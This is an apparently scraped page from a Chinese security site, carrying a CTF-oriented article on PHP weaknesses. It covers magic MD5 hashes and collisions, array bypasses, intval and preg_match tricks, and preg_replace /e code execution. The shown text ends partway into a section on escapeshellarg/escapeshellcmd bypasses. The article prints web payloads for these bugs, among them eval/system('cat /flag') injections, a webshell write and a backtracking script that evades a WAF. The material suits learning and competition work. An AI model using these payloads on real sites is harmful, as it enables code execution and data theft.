user-label-verify"></a></p><p class="hint">冲冲冲</p><div class="bottom"><ul class="bottom-1"><li>文章</li><li><strong>3</strong></li></ul><ul class="bottom-2"><li>粉丝</li><li><strong>7</strong></li></ul><div class="spacer"></div><!----></div></div></div><div class="_64"><h3 class="title"> TA的文章</h3><ul><li><h5><a href="https://www.anquanke.com/post/id/231507">CTF/PHP特性汇总</a></h5><p>2021-03-15 14:30:04</p></li><li><h5><a href="https://www.anquanke.com/post/id/231407">从浅入深学习PHP文件包含</a></h5><p>2021-03-04 15:30:59</p></li><li><h5><a href="https://www.anquanke.com/post/id/228176">浅析Python SSTI/沙盒逃逸</a></h5><p>2021-01-29 14:30:10</p></li></ul></div><div class="_61"><h3 class="title"> 相关文章</h3><ul><li><h5><a href="https://www.anquanke.com/post/id/286967">Ichunqiu云境 —— Exchange Writeup</a></h5><p>2023-03-03 14:30:36</p></li><li><h5><a href="https://www.anquanke.com/post/id/284201">Ichunqiu云境 - Delegation Writeup</a></h5><p>2023-01-06 10:30:50</p></li><li><h5><a href="https://www.anquanke.com/post/id/284260">Ichunqiu云境 —— Tsclient Writeup</a></h5><p>2023-01-05 10:30:31</p></li><li><h5><a href="https://www.anquanke.com/post/id/284307">活动 | 长亭科技2023第五届 Real World CTF 战火已燃，等你来战！</a></h5><p>2022-12-21 17:00:34</p></li><li><h5><a href="https://www.anquanke.com/post/id/283073">从一道题入门 UEFI PWN</a></h5><p>2022-11-11 15:30:05</p></li><li><h5><a href="https://www.anquanke.com/post/id/282335">2022年工业信息安全技能大赛“望岳杯”锦标赛 wp</a></h5><p>2022-10-31 15:30:36</p></li><li><h5><a href="https://www.anquanke.com/post/id/277807">精彩回顾 | 冠军出炉！2022字节安全AI挑战赛圆满落幕</a></h5><p>2022-10-19 15:00:56</p></li></ul></div><div class="_52"><h3 class="title">热门推荐</h3><ul></ul></div></div><div class="_57 m-catalog-fixed"><div class="m-catalog-fixed wrap"><div class="title">文章目录</div><ul class="list"><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231507#h2-0">前言：</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231507#h2-1">0x00:Hash比较缺陷</a><ul></ul></li><li class="item"><a class="g-line1 on" target="_self" href="https://www.anquanke.com/post/id/231507#h2-2">0x01:md5</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231507#h2-3">0x03:intval函数绕过</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231507#h2-4">0x04:preg_match函数绕过</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231507#h2-5">0x05: preg_replace /e 模式下的代码执行</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231507#h2-6">0x06：in_array宽松比较</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231507#h2-7">0x07:变量覆盖</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231507#h2-8">0x08:通过数组绕过</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231507#h2-9">0x09：PHP自身特性</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231507#h2-10">0x10：escapeshellarg&amp;escapeshellcmd函数绕过</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231507#h2-11">0x11：PHP精度绕过缺陷</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231507#h2-12">0x12:PHP中类的运用</a><ul></ul></li><li class="item"><a class="g-line1" target="_self" href="https://www.anquanke.com/post/id/231507#h2-13">0x13：一些姿势汇总</a><ul></ul></li></ul></div></div></div></div><div class="_8"><div class="g-w main"><div class="col1"><p class="col1-logo"><img src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t018717b31ed82fff86.png"></p><div class="col1-link"><b class="col1-weixin"></b><a href="https://weibo.com/360adlab" class="col1-sina"></a><a href="https://zhuanlan.zhihu.com/c_118578260" class="col1-zhi"></a></div></div><div class="col2"><div class="title">安全客</div><ul class="col2-list"><li><a href="https://www.anquanke.com/about" rel="noopener noreferrer" target="_blank">关于我们</a></li><li><a href="https://www.anquanke.com/note/contact" target="_blank" rel="noopener noreferrer">联系我们</a></li><li><a href="https://www.anquanke.com/note/protocol" target="_blank" rel="noopener noreferrer">用户协议</a></li></ul></div><div class="col3"><div class="title">商务合作</div><ul class="col3-list"><li><a href="https://www.anquanke.com/note/business" target="_blank" rel="noopener noreferrer">合作内容</a></li><li><a href="https://www.anquanke.com/note/contact" target="_blank" rel="noopener noreferrer">联系方式</a></li><li><a href="https://www.anquanke.com/link" target="_blank" rel="noopener noreferrer">友情链接</a></li></ul></div><div class="col4"><div class="title">内容需知</div><ul><li><a href="https://www.anquanke.com/contribute/tips" target="_blank" rel="noopener noreferrer">投稿须知</a></li><li><a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener noreferrer">转载须知</a></li><li>官网QQ群8：819797106</li><li>官网QQ群3：830462644(已满)</li><li>官网QQ群2：814450983(已满)</li><li>官网QQ群1：702511263(已满)</li></ul></div><div class="col5"><div class="title">合作单位</div><ul><li><a href="http://www.cert.org.cn/" target="_blank" rel="noopener noreferrer"><img alt="安全客" src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t01592a959354157bc0.png" style="max-height: 40px;"></a></li><li style="margin-top: -20px;"><a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener noreferrer"><img alt="安全客" src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t014f76fcea94035e47.png" style="max-height: 50px; margin-top: 10px;"></a></li></ul></div></div><div class="right g-w"><span>Copyright © 北京奇虎科技有限公司 360网络攻防实验室 安全客 All Rights Reserved </span><a href="https://beian.miit.gov.cn/">京ICP备08010314号-66</a><span id="cnzz_stat_icon_1271278035"><a href="https://www.cnzz.com/stat/website.php?web_id=1271278035" target="_blank" title="站长统计"><img border="0" hspace="0" vspace="0" src="https://icon.cnzz.com/img/pic.gif"></a></span></div><div class="layer" style="display: none;"><div class="layer-main"><div class="layer-title">微信二维码</div><b class="layer-close">X</b><img src="./CTF_PHP特性汇总-安全客 - 安全资讯平台_files/t0151209205b47f2270.jpg" alt="安全客"></div></div></div></div><script>window.__state__={"artical":{"post":{"id":231507,"title":"CTF/PHP特性汇总","category_name":"安全知识","category_slug":"knowledge","desc":"做CTF题时经常会遇到各种php弱类型和一些函数的绕过方法，由于知识比较零碎，就总结一下我所遇到的，也方便自己以后观看。","date":"2021-03-15 14:30:04","time_interval":"2021-03-15","status":"publish","comment":0,"cover":"https://p5.ssl.qhimg.com/t0156b4ea7a1af8f08b.png","subject":false,"red":false,"type":"origin","url":"","source":"","fee":"400","origin_author":"","pv":269776,"like_count":29,"liked":0,"tags":["CTF"],"is_favorite":false,"favorite_count":48,"content":"<html>\n<head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"></head>\n<body>\n<p><img class=\"alignnone size-full wp-image-234400 aligncenter\" alt=\"\" width=\"720\" height=\"360\" data-original=\"https://p5.ssl.qhimg.com/t0156b4ea7a1af8f08b.png\"></p>\n<p> </p>\n<h2 name=\"h2-0\" id=\"h2-0\">前言：</h2>\n<p>做CTF题时经常会遇到各种php弱类型和一些函数的绕过方法，由于知识比较零碎，就总结一下我所遇到的，也方便自己以后观看。</p>\n<p> </p>\n<h2 name=\"h2-1\" id=\"h2-1\">0x00:Hash比较缺陷</h2>\n<blockquote><p><code>PHP</code>在处理哈希字符串时，通过<code>!=</code>或<code>==</code>来对哈希值进行比较，它把每一个以<code>0e</code>开头的哈希值都解释为<code>0</code>，所以如果两个不同的密码经过哈希以后，其哈希值都是以<code>0e</code>开头的，那么<code>PHP</code>将会认为他们相同，都是<code>0</code></p></blockquote>\n<p><img class=\"alignnone size-full wp-image-234337 aligncenter\" alt=\"\" width=\"493\" height=\"191\" data-original=\"https://p1.ssl.qhimg.com/t0164f4d3638edfd342.png\"></p>\n<p>审计代码，我们输入的不能相等，但<code>md5</code>却需要相等，这明显的就是利用<code>Hash</code>的比较缺陷来做</p>\n<p>我们只要找出两个数再<code>md5</code>加密后都为<code>0e</code>开头的即可，常用的有以下几种</p>\n<pre><code class=\"lang-c\">QNKCDZO\r\n0e830400451993494058024219903391\r\ns878926199a\r\n0e545993274517709034328855841020\r\ns155964671a\r\n0e342768416822451524974117254469\r\ns214587387a\r\n0e848240448830537924465865611904\r\ns214587387a\r\n0e848240448830537924465865611904\r\ns878926199a\r\n0e545993274517709034328855841020\r\ns1091221200a\r\n0e940624217856561557816327384675\r\n</code></pre>\n<p>所以构造<code>a=QNKCDZO&amp;b=s878926199a</code>即可绕过</p>\n<p> </p>\n<h2 name=\"h2-2\" id=\"h2-2\">0x01:md5</h2>\n<h4 id=\"h4--md5-\">\n<a class=\"reference-link\" name=\"%E7%AC%AC%E4%B8%80%E7%A7%8D%EF%BC%9Amd5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87\"></a>第一种：md5函数绕过</h4>\n<blockquote><p>一、<code>md5()</code>函数获取不到数组的值，默认数组为0<br>\n二、<code>sha1()</code>函数无法处理数组类型，将报错并返回false</p></blockquote>\n<p><img class=\"size-full wp-image-234338 aligncenter\" alt=\"\" width=\"571\" height=\"320\" data-original=\"https://p0.ssl.qhimg.com/t0155a47be34a8f7084.png\"></p>\n<p>payload：</p>\n<pre><code class=\"lang-c\">name[]=1&amp;password[]=2\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-234340 aligncenter\" alt=\"\" width=\"595\" height=\"224\" data-original=\"https://p5.ssl.qhimg.com/t01d85d82a74fb3d21f.png\"></p>\n<p>注意这里是<code>===</code>，不是<code>==</code>，所以这里采用<code>md5()</code>函数获取不到数组的值，默认数组为0这个特性来做，payload:</p>\n<pre><code class=\"lang-c\">username[]=1&amp;password[]=2\r\n</code></pre>\n<h4 id=\"h4--md5-\">\n<a class=\"reference-link\" name=\"%E7%AC%AC%E4%BA%8C%E7%A7%8D%EF%BC%9Amd5%E5%BC%BA%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87\"></a>第二种：md5强类型绕过</h4>\n<pre><code class=\"lang-cpp\">(string)$_POST['a1']!==(string)$_POST['a2']\r\n &amp;&amp; md5($_POST['a1'])===md5($_POST['a2'])}\r\n</code></pre>\n<p>例如这段代码，使用数组就不可行，因为最后转为字符串进行比较，所以只能构造两个MD5值相同的不同字符串.<br><img alt=\"\" data-original=\"https://cdn.nlark.com/yuque/0/2021/png/5370867/1613553900781-02d9a72a-56b9-493d-b28b-e448258a7bb4.png#align=left&amp;display=inline&amp;height=96&amp;margin=%5Bobject%20Object%5D&amp;originHeight=96&amp;originWidth=893&amp;size=0&amp;status=done&amp;style=none&amp;width=893\"><br>\n两组经过url编码后的值</p>\n<pre><code class=\"lang-cpp\">#1\r\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2\r\nb=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\r\n#2\r\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2\r\nb=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%\r\n</code></pre>\n<p> </p>\n<h2 name=\"h2-3\" id=\"h2-3\">0x03:intval函数绕过</h2>\n<h4 id=\"h4--\">\n<a class=\"reference-link\" name=\"%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%89%B9%E6%80%A7%EF%BC%9A\"></a>第一个特性：</h4>\n<p><img class=\"alignnone size-full wp-image-234341 aligncenter\" alt=\"\" width=\"1060\" height=\"160\" data-original=\"https://p3.ssl.qhimg.com/t01c68c908123b9d616.png\"></p>\n<h4 id=\"h4--\">\n<a class=\"reference-link\" name=\"%E7%AC%AC%E4%BA%8C%E4%B8%AA%E7%89%B9%E6%80%A7%EF%BC%9A\"></a>第二个特性：</h4>\n<p><img class=\"alignnone size-full wp-image-234342 aligncenter\" alt=\"\" width=\"1017\" height=\"516\" data-original=\"https://p0.ssl.qhimg.com/t01ad9612f4b2ba7d98.png\"></p>\n<p>例如：</p>\n<p><img class=\"alignnone size-full wp-image-234343 aligncenter\" alt=\"\" width=\"599\" height=\"246\" data-original=\"https://p2.ssl.qhimg.com/t01d70e23bf06a45737.png\"></p>\n<p>payload如下:</p>\n<pre><code class=\"lang-python\">?num=0x117c\r\n?num=010574\r\n</code></pre>\n<p>除此之外，这个函数还可以使用小数点来进行操作</p>\n<p><img class=\"alignnone size-full wp-image-234344 aligncenter\" alt=\"\" width=\"1203\" height=\"212\" data-original=\"https://p2.ssl.qhimg.com/t01f625151f9faa6888.png\"></p>\n<h4 id=\"h4--\">\n<a class=\"reference-link\" name=\"%E7%AC%AC%E4%B8%89%E4%B8%AA%E7%89%B9%E6%80%A7%EF%BC%9A\"></a>第三个特性：</h4>\n<blockquote><p>如果$base为0直到遇上数字或正负符号才开始做转换，在遇到非数字或字符串结束时(\\0)结束转换，但前提是进行弱类型比较</p></blockquote>\n<p>例如：</p>\n<p><img class=\"alignnone size-full wp-image-234345 aligncenter\" alt=\"\" width=\"627\" height=\"306\" data-original=\"https://p3.ssl.qhimg.com/t0135b53eb67f64d71e.png\"></p>\n<p>payload：</p>\n<pre><code class=\"lang-python\">?num=4476e1\r\n</code></pre>\n<p> </p>\n<h2 name=\"h2-4\" id=\"h2-4\">0x04:preg_match函数绕过</h2>\n<h4 id=\"h4--m\">\n<a class=\"reference-link\" name=\"%E7%AC%AC%E4%B8%80%E7%A7%8D%EF%BC%9A/m\"></a>第一种：/m</h4>\n<pre><code class=\"lang-python\">if(preg_match('/^php$/im',$a))\r\n</code></pre>\n<blockquote><p>/m 多行匹配，但是当出现换行符 <code>%0a</code>的时候，会被当做两行处理，而此时只可以匹配第 1 行，后面的行就会被忽略。</p></blockquote>\n<h4 id=\"h4--\">\n<a class=\"reference-link\" name=\"%E7%AC%AC%E4%BA%8C%E7%A7%8D%EF%BC%9A%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87\"></a>第二种：回溯绕过</h4>\n<p><img class=\"alignnone size-full wp-image-234346 aligncenter\" alt=\"\" width=\"657\" height=\"424\" data-original=\"https://p5.ssl.qhimg.com/t015da8669f4ac0b351.png\"></p>\n<p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit,可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限</p>\n<p><img class=\"alignnone size-full wp-image-234347 aligncenter\" alt=\"\" width=\"539\" height=\"80\" data-original=\"https://p2.ssl.qhimg.com/t01d245b92559eea0e3.png\"></p>\n<p>回溯次数上限默认是100万,如果回溯次数超过了100万，preg_match返回的<strong>便不再是0或1，而是false</strong>，利用这个方法，可以写一个脚本，来使回溯次数超出pcre.backtrack_limit限制，进而绕过WAF</p>\n<pre><code class=\"lang-groovy\">import requests\r\n\r\nurl = 'http://3638bf4e-f63d-477c-95eb-ba023f279de8.chall.ctf.show:8080/'\r\n\r\ndata = {\r\n    'f':'very'*250000+'ctfshow'\r\n}\r\n\r\nreponse = requests.post(url,data=data)\r\n\r\nprint(reponse.text)\r\n</code></pre>\n<p> </p>\n<h2 name=\"h2-5\" id=\"h2-5\">0x05: preg_replace /e 模式下的代码执行</h2>\n<p><img class=\"alignnone size-full wp-image-234348 aligncenter\" alt=\"\" width=\"1294\" height=\"425\" data-original=\"https://p4.ssl.qhimg.com/t01cd8d104a8b563d8a.png\"></p>\n<blockquote><p>/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行</p></blockquote>\n<p><strong>ZJCTF，不过如此</strong></p>\n<pre><code class=\"lang-cpp\">&lt;?php\r\n$id = $_GET['id'];\r\n$_SESSION['id'] = $id;\r\n\r\nfunction complex($re, $str) {\r\n    return preg_replace(\r\n        '/(' . $re . ')/ei',\r\n        'strtolower(\"\\\\1\")',\r\n        $str\r\n    );\r\n}\r\n\r\nforeach($_GET as $re =&gt; $str) {\r\n    echo complex($re, $str). \"\\n\";\r\n}\r\nfunction getFlag(){\r\n    @eval($_GET['cmd']);\r\n}\r\n</code></pre>\n<p>这里的代码便涉及到了preg_replace /e 模式下的代码执行，原理的话师傅讲的很明白，这里不再叙述</p>\n<p><strong>直接放payload：</strong></p>\n<pre><code class=\"lang-cpp\">\\S*=${phpinfo()}\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-234349 aligncenter\" alt=\"\" width=\"1375\" height=\"485\" data-original=\"https://p0.ssl.qhimg.com/t016432685abfce5d2f.png\"></p>\n<p><strong>得到flag</strong></p>\n<pre><code class=\"lang-cpp\">?\\S*=${eval(getFlag())}&amp;cmd=system('cat /flag');\r\n#最后的分号要加，除此之外，也可以：\r\n?\\S*=${eval($_POST[lemon])}\r\n#POST DATA\r\nlemon=system('cat /flag');\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-234350 aligncenter\" alt=\"\" width=\"934\" height=\"333\" data-original=\"https://p2.ssl.qhimg.com/t01fa65cf3135bc7a30.png\"></p>\n<p> </p>\n<h2 name=\"h2-6\" id=\"h2-6\">0x06：in_array宽松比较</h2>\n<p>in_array函数有一个特性<strong>，</strong>如果不设置第三个参数将使用宽松的比较</p>\n<p><img class=\"alignnone size-full wp-image-234351 aligncenter\" alt=\"\" width=\"1130\" height=\"467\" data-original=\"https://p3.ssl.qhimg.com/t01124a33dda1017691.png\"></p>\n<p>可以在本地测试一下</p>\n<p><img class=\"alignnone size-full wp-image-234352 aligncenter\" alt=\"\" width=\"973\" height=\"266\" data-original=\"https://p5.ssl.qhimg.com/t0188fed245ee5ffe16.png\"></p>\n<p>例如这道题：</p>\n<p><img class=\"alignnone size-full wp-image-234353 aligncenter\" alt=\"\" width=\"831\" height=\"259\" data-original=\"https://p0.ssl.qhimg.com/t01ddee9dbe4fec596b.png\"></p>\n<p>上面的代码对下面无影响，直接写webshell即可，但是要注意文件名开头必须是以数字开头的</p>\n<pre><code class=\"lang-groovy\">?n=1.php\r\nDATA:\r\ncontent=&lt;?php system('cat *.php');?&gt;\r\n</code></pre>\n<p> </p>\n<h2 name=\"h2-7\" id=\"h2-7\">0x07:变量覆盖</h2>\n<h4 id=\"h4--extract-parse_str-\">\n<a class=\"reference-link\" name=\"%E7%AC%AC%E4%B8%80%E7%A7%8D%EF%BC%9Aextract%E5%87%BD%E6%95%B0%E3%80%81parse_str%E5%87%BD%E6%95%B0\"></a>第一种：extract函数、parse_str函数</h4>\n<blockquote><p><code>extract()</code> 函数使用<strong>数组键名</strong>作为<strong>变量名</strong>，使用<strong>数组键值</strong>作为<strong>变量值</strong>，当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖</p></blockquote>\n<p><img class=\"alignnone size-full wp-image-234354 aligncenter\" alt=\"\" width=\"578\" height=\"194\" data-original=\"https://p5.ssl.qhimg.com/t019c197edf2a17fb3b.png\"></p>\n<p><code>POST</code>方法传输进来的值通过<code>extrace()</code>函数处理，直接传入以<code>POST</code>的方式传入<code>pass=1&amp;thepassword_123=1</code>就可以进行将原本的变量覆盖，并且使两个变量相等即可。</p>\n<p>还有就是这两个函数如果结合起来使用，也会造成变量覆盖</p>\n<p><img class=\"alignnone size-full wp-image-234355 aligncenter\" alt=\"\" width=\"940\" height=\"310\" data-original=\"https://p2.ssl.qhimg.com/t01ee4693c210d149c7.png\"></p>\n<p>代码中同时含有<code>parse_str和extract($_POST)</code>可以先将GET方法请求的解析成变量，然后再利用extract() 函数从数组中将变量导入到当前的符号表,故payload为：</p>\n<pre><code class=\"lang-groovy\">?_POST[key1]=36d&amp;_POST[key2]=36d\r\n</code></pre>\n<h4 id=\"h4--\">\n<a class=\"reference-link\" name=\"%E7%AC%AC%E4%BA%8C%E7%A7%8D%EF%BC%9A%24%24%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96\"></a>第二种：$$变量覆盖</h4>\n<p>$$变量覆盖要具体结合代码来看，可能会需要借助<strong>某个参数进行传递值</strong>，也有可能使用<strong>$GLOBALS（引用全局作用域中可用的全部变量）</strong>来做题，例如：</p>\n<p><img class=\"alignnone size-full wp-image-234356 aligncenter\" alt=\"\" width=\"923\" height=\"478\" data-original=\"https://p3.ssl.qhimg.com/t0167fa970a0ffb85c8.png\"></p>\n<p>这道题便需要借助某个参数进行传递值，具体也不详细说明了，payload如下：</p>\n<pre><code class=\"lang-python\">?Sn0w=flag\r\nDATA:\r\nerror=Sn0w\r\n实际在代码中为\r\nGET:\r\n$Sn0w=$flag\r\nPOST:\r\n$error=$Sn0w\r\n</code></pre>\n<p> </p>\n<h2 name=\"h2-8\" id=\"h2-8\">0x08:通过数组绕过</h2>\n<h4 id=\"h4-ereg-\">\n<a class=\"reference-link\" name=\"ereg()%E5%87%BD%E6%95%B0\"></a>ereg()函数</h4>\n<p><img class=\"alignnone size-full wp-image-234357 aligncenter\" alt=\"\" width=\"1151\" height=\"324\" data-original=\"https://p4.ssl.qhimg.com/t0180b27e3648257454.png\"></p>\n<blockquote><p>一、ereg()函数存在NULL截断漏洞,可以%00截断，遇到%00则默认为字符串的结束，所以可以绕过一些正则表达式的检查。<br>\n二、ereg()只能处理字符串的，遇到数组做参数返回NULL。<br>\n三、空字符串的类型是<code>string</code>，<code>NULL</code>的类型是<code>NULL</code>,<code>false、true</code>是<code>boolean</code>类型</p></blockquote>\n<h4 id=\"h4-strpos-\">\n<a class=\"reference-link\" name=\"strpos()%E5%87%BD%E6%95%B0\"></a>strpos()函数</h4>\n<p><img class=\"alignnone size-full wp-image-234358 aligncenter\" alt=\"\" width=\"1127\" height=\"400\" data-original=\"https://p2.ssl.qhimg.com/t01a4d9fbc942782a37.png\"></p>\n<blockquote><p>strpos()函数如果传入数组，便会返回NULL</p></blockquote>\n<h4 id=\"h4-strcmp-\">\n<a class=\"reference-link\" name=\"strcmp()%E5%87%BD%E6%95%B0\"></a>strcmp()函数</h4>\n<p><code>strcmp()</code>函数比较两个字符串(区分大小写）,定义中是比较<strong>字符串类型</strong>的，但如果输入其他类型这个函数将发生错误，在官方文档的说明中说到在<code>php 5.2</code>版本之前，利用<code>strcmp</code>函数将数组与字符串进行比较会返回<code>-1</code>，但是从<code>5.3</code>开始，会返回<code>0</code>。</p>\n<p><img class=\"alignnone size-full wp-image-234359 aligncenter\" alt=\"\" width=\"572\" height=\"342\" data-original=\"https://p2.ssl.qhimg.com/t018d3fcb5df94910fc.png\"></p>\n<p>payload:</p>\n<pre><code class=\"lang-php\">#POST DATA\r\npass[]=1\r\n</code></pre>\n<p>数组和字符进行比较结果不会返回<code>1</code>，即为<code>false</code>,加上非的作用，即可变成<code>true</code>,则满足条件</p>\n<p> </p>\n<h2 name=\"h2-9\" id=\"h2-9\">0x09：PHP自身特性</h2>\n<h4 id=\"h4-php-\">\n<a class=\"reference-link\" name=\"PHP%E7%9A%84%E5%8F%98%E9%87%8F%E5%90%8D%E6%A0%BC%E5%BC%8F\"></a>PHP的变量名格式</h4>\n<p><strong>在CTF中也经常考察PHP的变量名格式，例如这道题：</strong></p>\n<p><img class=\"alignnone size-full wp-image-234360 aligncenter\" alt=\"\" width=\"1055\" height=\"295\" data-original=\"https://p4.ssl.qhimg.com/t014ac57dd428b280c6.png\"></p>\n<p><code>$_POST['CTF_SHOW.COM']</code>无法传入参数，这是因为PHP变量名应该只有<strong>数字字母下划线。</strong>而且GET或POST方式传进去的变量名,会自动将<code>**空格**</code> <code>+ . [</code>转换为<code>_</code></p>\n<p>payload:</p>\n<pre><code class=\"lang-cpp\">DATA:\r\nCTF_SHOW=1&amp;CTF[SHOW.COM=1\r\n</code></pre>\n<h4 id=\"h4-php-\">\n<a class=\"reference-link\" name=\"PHP%E6%95%B0%E5%AD%97%E5%8F%AF%E4%B8%8E%E5%AD%97%E7%AC%A6%E5%81%9A%E8%BF%90%E7%AE%97\"></a>PHP数字可与字符做运算</h4>\n<p><img class=\"alignnone size-full wp-image-234361 aligncenter\" alt=\"\" width=\"1894\" height=\"544\" data-original=\"https://p1.ssl.qhimg.com/t01f32767c97ad68dfe.png\"></p>\n<p> </p>\n<h2 name=\"h2-10\" id=\"h2-10\">0x10：escapeshellarg&amp;escapeshellcmd函数绕过</h2>\n<p>模仿师傅的例子进行学习<br><a href=\"http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/\">谈谈escapeshellarg参数绕过和注入的问题</a></p>\n<p><strong>escapeshellarg</strong></p>\n<p><img class=\"alignnone size-full wp-image-234362 aligncenter\" alt=\"\" width=\"1348\" height=\"466\" data-original=\"https://p0.ssl.qhimg.com/t0138ca46921ef8b5d9.png\"></p>\n<p><strong>escapeshellcmd</strong></p>\n<p><img class=\"alignnone size-full wp-image-234363 aligncenter\" alt=\"\" width=\"1312\" height=\"490\" data-original=\"https://p0.ssl.qhimg.com/t0140e2566232377e3e.png\"></p>\n<p>先通过例子来查看一下<strong>escapeshellarg</strong>函数的作用吧</p>\n<pre><code class=\"lang-cpp\">&lt;?php \r\nvar_dump(escapeshellarg(\"123\"));\r\nvar_dump(escapeshellarg(\"12'     3\"));\r\n?&gt;\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-234364 aligncenter\" alt=\"\" width=\"1383\" height=\"182\" data-original=\"https://p5.ssl.qhimg.com/t0135e9bd6c4f45f74f.png\"></p>\n<p>在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。</p>\n<p><img class=\"alignnone size-full wp-image-234365 aligncenter\" alt=\"\" width=\"382\" height=\"188\" data-original=\"https://p1.ssl.qhimg.com/t01ac3e22180a668caf.png\"></p>\n<p>所以即使参数用了 <strong>escapeshellarg</strong> 函数过滤单引号，但参数在拼接命令的时候如果用了双引号的话还是会导致命令执行的漏洞。</p>\n<p>再来看一下<strong>escapeshellcmd</strong> 函数的作用</p>\n<p><img class=\"alignnone size-full wp-image-234366 aligncenter\" alt=\"\" width=\"445\" height=\"144\" data-original=\"https://p4.ssl.qhimg.com/t011c090c3652b7e746.png\"></p>\n<p>两个函数都会对单引号进行处理，但是有区别的,如下：</p>\n<p><img class=\"alignnone size-full wp-image-234367 aligncenter\" alt=\"\" width=\"864\" height=\"191\" data-original=\"https://p5.ssl.qhimg.com/t01a632f970782dadc5.png\"></p>\n<p>对于单个单引号, <strong>escapeshellarg</strong> 函数转义后,还会在左右各加一个单引号,但 <strong>escapeshellcmd</strong> 函数是直接加一个转义符，对于成对的单引号, <strong>escapeshellcmd</strong> 函数默认不转义,但 <strong>escapeshellarg</strong> 函数转义</p>\n<p>那既然有这个差异，如果<strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg()</strong> 一起出现会有什么问题<br><strong>测试</strong></p>\n<p><img class=\"alignnone size-full wp-image-234368 aligncenter\" alt=\"\" width=\"732\" height=\"240\" data-original=\"https://p1.ssl.qhimg.com/t01b0dbc77d63d0ef1e.png\"></p>\n<p><strong>结果</strong></p>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p0.ssl.qhimg.com/t01ce491028baf76639.png\"></p>\n<p><strong>分析</strong></p>\n<pre><code class=\"lang-cpp\">一开始传入的参数\r\n127.0.0.1' -v -d a=1\r\n经过escapeshellarg函数处理，先转义再用单引号括起来\r\n'127.0.0.1'\\'' -v -d a=1'\r\n再经过escapeshellcmd函数处理，数中的\\以及a=1'中的单引号进行处理转义\r\n'127.0.0.1'\\\\'' -v -d a=1\\'\r\n由于这一步的处理，使得\\\\被解释成了\\而不再是转义字符，所以单引号配对连接之后将语句分割为三个部分\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-234369 aligncenter\" alt=\"\" width=\"496\" height=\"77\" data-original=\"https://p4.ssl.qhimg.com/t01ebfca559b87ec852.png\"></p>\n<p>因此最后system函数是对<code>127.0.0.1\\</code>发起请求，POST 数据为<code>a=1'</code>，如果两个函数翻过来则不会出现这个问题</p>\n<p><img class=\"alignnone size-full wp-image-234370 aligncenter\" alt=\"\" width=\"1401\" height=\"190\" data-original=\"https://p3.ssl.qhimg.com/t012e569564b9d49eaa.png\"></p>\n<p>接下来就通过一个题目来实践一下：</p>\n<p><strong>Online Tool</strong></p>\n<p><img class=\"alignnone size-full wp-image-234371 aligncenter\" alt=\"\" width=\"612\" height=\"330\" 